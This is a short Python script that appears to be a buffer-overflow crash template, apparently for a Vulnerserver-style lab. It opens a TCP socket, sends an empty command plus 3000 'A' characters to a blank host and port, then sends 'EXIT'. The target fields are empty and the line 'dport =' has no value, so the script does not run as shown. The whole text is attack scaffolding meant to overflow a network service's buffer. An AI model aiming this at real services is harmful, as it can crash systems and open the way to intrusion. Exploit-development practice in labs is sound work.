#!/usr/bin/python3

import socket

dest = ''
dport =  
chars = 'A' * 3000
cmd = ''
end = 'EXIT\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((dest, dport))
s.recv(100)
s.sendall((cmd + chars).encode())
print(s.recv(100))
s.send((end).encode())
print(s.recv(100))
s.close()
